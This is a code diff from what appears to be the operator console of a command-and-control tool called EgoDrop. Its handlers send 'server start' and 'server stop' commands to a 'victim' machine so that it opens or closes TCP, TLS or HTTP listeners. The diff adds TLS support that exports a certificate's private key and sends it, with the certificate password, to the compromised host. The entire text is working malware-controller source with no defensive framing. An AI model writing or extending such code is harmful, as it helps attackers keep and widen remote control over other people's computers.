@@ -5,6 +5,8 @@ using System.ComponentModel;
 using System.Data;
 using System.Drawing;
 using System.Linq;
+using System.Security.Cryptography;
+using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -75,15 +77,6 @@ namespace EgoDrop
             */
         }
 
-        private void button2_Click(object sender, EventArgs e)
-        {
-            m_victim.fnSendCommand(m_szVictimID, new string[]
-            {
-                "server",
-                "stop",
-            });
-        }
-
         //Start
         private void toolStripButton1_Click(object sender, EventArgs e)
         {
@@ -92,10 +85,30 @@ namespace EgoDrop
                 string szName = item.Text;
                 var listener = m_dicListener[szName].m_stListener;
 
-                switch (listener.protoListener)
+                var proto = listener.protoListener;
+                if (proto == clsSqlite.enListenerProtocol.TCP)
                 {
-                    case clsSqlite.enListenerProtocol.TCP:
-                        clsCrypto crypto = new clsCrypto(true);
+                    clsCrypto crypto = new clsCrypto(true);
+
+                    m_victim.fnSendCommand(m_szVictimID, new string[]
+                    {
+                        "server",
+                        "start",
+                        Enum.GetName(listener.protoListener),
+                        listener.nPort.ToString(),
+
+                        Convert.ToBase64String(crypto.m_abRSAKeyPair.abPublicKey),
+                        Convert.ToBase64String(crypto.m_abRSAKeyPair.abPrivateKey),
+                    });
+                }
+                else if (proto == clsSqlite.enListenerProtocol.TLS)
+                {
+                    var cert = new X509Certificate2(listener.szCertPath, listener.szCertPassword, X509KeyStorageFlags.Exportable | X509KeyStorageFlags.MachineKeySet);
+                    if (cert.GetRSAPrivateKey() is RSA rsaKey)
+                    {
+                        byte[] abCert = File.ReadAllBytes(listener.szCertPath);
+                        byte[] abKey = rsaKey.ExportPkcs8PrivateKey();
+
                         m_victim.fnSendCommand(m_szVictimID, new string[]
                         {
                             "server",
@@ -103,27 +116,40 @@ namespace EgoDrop
                             Enum.GetName(listener.protoListener),
                             listener.nPort.ToString(),
 
-                            Convert.ToBase64String(crypto.m_abRSAKeyPair.abPublicKey),
-                            Convert.ToBase64String(crypto.m_abRSAKeyPair.abPrivateKey),
+                            Convert.ToBase64String(abCert),
+                            listener.szCertPassword,
                         });
-                        break;
-                    case clsSqlite.enListenerProtocol.TLS:
+                    }
+                }
+                else if (proto == clsSqlite.enListenerProtocol.HTTP)
+                {
+                    clsCrypto crypto = new clsCrypto(true);
 
-                        break;
-                    case clsSqlite.enListenerProtocol.HTTP:
+                    m_victim.fnSendCommand(m_szVictimID, new string[]
+                    {
+                        "server",
+                        "start",
+                        Enum.GetName(listener.protoListener),
+                        listener.nPort.ToString(),
 
-                        break;
+                        Convert.ToBase64String(crypto.m_abRSAKeyPair.abPublicKey),
+                        Convert.ToBase64String(crypto.m_abRSAKeyPair.abPrivateKey),
+                    });
                 }
             }
         }
 
         private void toolStripButton2_Click(object sender, EventArgs e)
         {
-            m_victim.fnSendCommand(m_szVictimID, new string[]
+            foreach (ListViewItem item in listView1.CheckedItems)
             {
-                "server",
-                "stop",
-            });
+                m_victim.fnSendCommand(m_szVictimID, new string[]
+                {
+                    "server",
+                    "stop",
+                    item.SubItems[2].Text,
+                });
+            }
         }
 
         //Check all.
